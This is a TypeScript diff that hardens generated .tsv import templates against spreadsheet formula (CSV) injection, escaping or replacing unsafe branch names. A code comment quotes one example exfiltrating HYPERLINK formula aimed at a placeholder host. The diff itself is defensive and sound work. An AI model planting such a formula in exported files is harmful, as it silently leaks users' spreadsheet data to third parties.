@@ -381,6 +381,46 @@ export function parseAreas(
 /* -------------------------------------------------------------------------- */
 
 /**
+ * Characters a spreadsheet reads as the start of a FORMULA.
+ *
+ * These templates are downloaded as `.tsv` and opened in Excel or Sheets, and
+ * both treat a cell beginning `=`, `+`, `-` or `@` as a formula. Branch names
+ * are administrator- and POS-supplied text, so a name like
+ * `=HYPERLINK("http://x/"&A1,"open")` would execute in the administrator's own
+ * spreadsheet the moment the file is opened — reading the rest of the sheet out
+ * to a third party with no prompt they would recognise as a warning. That is
+ * the CSV-injection class, and the defence is to stop the cell being a formula
+ * at all rather than to trust the spreadsheet to ask.
+ */
+const FORMULA_LEAD = /^[=+\-@]/;
+
+/**
+ * Characters that break the FILE rather than the formula bar.
+ *
+ * A tab inside a name invents a column and a newline invents a row, so one
+ * branch name could silently re-shape every row below it — and the row it
+ * invents would be parsed on import as a real one.
+ */
+const STRUCTURAL = /[\t\r\n]/;
+
+function isUnsafeCell(value: string): boolean {
+  return FORMULA_LEAD.test(value) || STRUCTURAL.test(value);
+}
+
+/**
+ * Neutralise a value for a column NO PARSER READS BACK.
+ *
+ * The `note` column is decorative — both parsers ignore it — so its contents
+ * can be changed freely. Structural characters collapse to a space, and a
+ * leading formula character is disarmed with the apostrophe that Excel and
+ * Sheets both treat as "this cell is text".
+ */
+function templateNote(value: string): string {
+  const flat = value.replace(/[\t\r\n]+/g, ' ').trim();
+  return FORMULA_LEAD.test(flat) ? `'${flat}` : flat;
+}
+
+/**
  * The token to put in a template's branch column.
  *
  * A NAME THIS DATABASE HOLDS TWICE WOULD MAKE ITS OWN TEMPLATE UNIMPORTABLE:
@@ -390,10 +430,16 @@ export function parseAreas(
  * trailing `note` column — ignored by both parsers, since neither recognises it
  * as a weekday or as `name_ar`/`name_en` — so a human can still tell two
  * identically named branches apart.
+ *
+ * AN UNSAFE NAME TAKES THAT SAME EXIT, and taking it here is why the branch
+ * column is not escaped instead: this column IS read back, so an
+ * apostrophe-prefixed name would resolve to no branch at all and the row would
+ * be refused. The id is a `uuid`, which by its own type can neither begin with
+ * a formula character nor contain a tab, so the fallback needs no escaping.
  */
 function templateToken(branch: ImportBranch, branches: readonly ImportBranch[]): string {
   const name = branch.nameEn.trim();
-  if (!name) return branch.id;
+  if (!name || isUnsafeCell(name)) return branch.id;
   const resolved = resolveBranch(name, branches);
   return resolved.branch && resolved.branch.id === branch.id ? name : branch.id;
 }
@@ -406,13 +452,17 @@ function templateToken(branch: ImportBranch, branches: readonly ImportBranch[]):
 export function hoursTemplate(branches: readonly ImportBranch[]): string {
   const header = ['branch', ...WEEKDAY_KEYS, 'note'].join('\t');
   const body = branches.map((b) =>
-    [templateToken(b, branches), ...WEEKDAY_KEYS.map(() => 'closed'), b.nameEn].join('\t'),
+    [templateToken(b, branches), ...WEEKDAY_KEYS.map(() => 'closed'), templateNote(b.nameEn)].join(
+      '\t',
+    ),
   );
   return [header, ...body].join('\n');
 }
 
 export function areasTemplate(branches: readonly ImportBranch[]): string {
   const header = ['branch', 'name_ar', 'name_en', 'note'].join('\t');
-  const body = branches.map((b) => [templateToken(b, branches), '', '', b.nameEn].join('\t'));
+  const body = branches.map((b) =>
+    [templateToken(b, branches), '', '', templateNote(b.nameEn)].join('\t'),
+  );
   return [header, ...body].join('\n');
 }
